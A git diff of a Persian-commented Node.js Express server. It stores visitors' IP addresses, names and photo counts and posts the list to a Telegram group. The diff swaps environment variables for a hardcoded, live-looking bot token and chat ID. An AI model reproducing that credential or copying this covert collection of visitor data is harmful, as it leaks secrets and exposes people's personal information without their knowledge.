@@ -1,45 +1,63 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const fetch = require('node-fetch');
+const axios = require('axios');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const port = process.env.PORT || 3000;
 
-// برای مدیریت فایل HTML
-app.use(express.static('public'));
+// برای ذخیره‌ی کاربران
+const users = [];
 
-// تنظیم Body Parser برای خواندن درخواست‌های JSON
+// Middleware
 app.use(bodyParser.json());
+app.use(express.static('public')); // برای ارائه فایل‌های استاتیک مثل index.html
 
-// مسیر برای دریافت اطلاعات از کلاینت
+// به‌روزرسانی اطلاعات کاربران
+app.post('/update-user', (req, res) => {
+    const { ip, name, photoCount } = req.body;
+    const existingUser = users.find(user => user.ip === ip);
+
+    if (existingUser) {
+        existingUser.name = name;
+        existingUser.photoCount = photoCount;
+    } else {
+        users.push({ ip, name, photoCount });
+    }
+
+    res.json({ success: true, message: 'User data updated.' });
+});
+
+// ارسال اطلاعات به تلگرام
 app.post('/send-to-telegram', async (req, res) => {
-    const { message } = req.body;
+    const chatId = '-1002221297200'; // ID گروه تلگرام
+    const botToken = '7045735164:AAHlNWHEWkS_TcN76rlDmdkC_mKLr1zN6cM'; // توکن ربات تلگرام
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN; // باید در Railway ست شود
-    const chatId = process.env.TELEGRAM_CHAT_ID; // باید در Railway ست شود
+    if (users.length === 0) {
+        return res.json({ success: false, message: 'No users to send.' });
+    }
+
+    const message = users.map(user => 
+        `Name: ${user.name}, IP: ${user.ip}, Photos Sent: ${user.photoCount || 0}`
+    ).join('\n');
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-            }),
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            chat_id: chatId,
+            text: `User List:\n${message}`,
         });
-
-        if (response.ok) {
-            res.status(200).send({ success: true, message: 'Message sent to Telegram!' });
-        } else {
-            const errorText = await response.text();
-            res.status(500).send({ success: false, error: errorText });
-        }
+        res.json({ success: true, message: 'Data sent to Telegram.' });
     } catch (error) {
-        res.status(500).send({ success: false, error: error.message });
+        console.error('Error sending to Telegram:', error);
+        res.json({ success: false, message: 'Failed to send to Telegram.' });
     }
 });
 
-// راه‌اندازی سرور
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+// صفحه اصلی (index.html)
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/index.html');
+});
+
+// سرور را راه‌اندازی کنید
+app.listen(port, () => {
+    console.log(`Server running on http://localhost:${port}`);
 });
